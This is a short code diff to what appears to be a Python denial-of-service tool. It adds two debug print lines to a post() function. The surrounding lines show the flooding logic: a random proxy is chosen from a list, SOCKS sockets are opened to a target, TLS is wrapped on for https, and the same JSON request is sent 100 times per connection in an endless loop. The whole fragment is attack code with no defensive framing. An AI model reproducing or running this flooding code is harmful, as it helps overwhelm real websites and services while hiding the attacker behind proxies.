@@ -317,6 +317,7 @@ def post(event,proxy_type):
     request = GenReqHeader("post")
     proxy = Choice(proxies).strip().split(":")
     event.wait()
+    print("Start post")
     while True:
         try:
             s = socks.socksocket()
@@ -329,9 +330,11 @@ def post(event,proxy_type):
             if brute:
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
+
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 s = ctx.wrap_socket(s,server_hostname=target)
+                print("enable socket")
             try:
                 for _ in range(100):
                     sent = s.send(json.dumps(request))
